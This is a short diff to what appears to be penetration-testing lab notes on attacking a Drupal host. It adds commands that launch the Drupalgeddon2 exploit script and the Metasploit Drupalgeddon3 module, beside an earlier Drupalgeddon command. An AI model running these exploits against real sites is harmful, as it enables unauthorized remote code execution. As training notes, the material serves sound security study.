@@ -26,3 +26,13 @@ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31
 ```
 python2.7 drupalgeddon.py 
 ```
+
+# Drupalgeddon2
+```
+python3 drupalgeddon2.py 
+```
+
+# Drupalgeddon3
+```
+exploit(multi/http/drupal_drupageddon3)
+```
